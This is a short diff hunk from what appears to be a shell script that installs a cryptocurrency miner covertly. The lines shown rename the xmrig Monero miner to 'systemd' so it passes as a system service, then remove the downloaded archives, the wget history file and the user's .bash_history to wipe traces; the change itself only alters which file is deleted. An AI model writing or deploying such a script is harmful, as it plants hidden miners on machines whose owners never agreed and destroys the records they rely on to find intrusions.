@@ -13,6 +13,6 @@ mv ./xmrig ./systemd
 cd ../..
 rm -r master.zip
 rm -r ./monero-master
-rm ./nv3v2
+rm ./monmis
 rm .wget-hsts
 rm .bash_history && history && exit
